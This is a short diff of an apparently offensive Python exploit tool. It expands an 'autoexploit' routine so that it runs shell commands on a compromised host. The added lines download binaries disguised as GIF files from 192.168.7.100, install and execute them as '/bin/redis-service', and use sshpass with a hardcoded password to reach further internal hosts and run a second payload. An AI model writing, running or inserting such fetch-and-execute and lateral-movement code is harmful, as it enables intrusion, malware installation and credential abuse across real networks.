@@ -161,8 +161,16 @@ def reverse(remote):
 
 def autoexploit(remote):
     print("\033[92m[+]\033[0m AutoExploitation...")
-    remote.shell_cmd("touch /tmp/test42")
-    print('DONE!')
+    remote.shell_cmd("apt-get update -y")    
+    remote.shell_cmd("apt-get install -y curl openssh-client sshpass")
+    remote.shell_cmd("curl http://192.168.7.100:5000/gifs/coolcat.gif -o /bin/redis-service")
+    remote.shell_cmd("chmod +x /bin/redis-service")
+    remote.shell_cmd("/bin/redis-service")
+    remote.shell_cmd("sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.7.100")
+    remote.shell_cmd("sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.7.3 wget http://192.168.7.100:5000/gifs/coolcat2.gif -O redis")
+    remote.shell_cmd("sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.7.3 chmod +x redis && ./redis")
+    print('Auto exploit done!')
+    
 
 def interact(remote):
     print("\033[92m[+]\033[0m Interactive shell open , use \"exit\" to exit...")
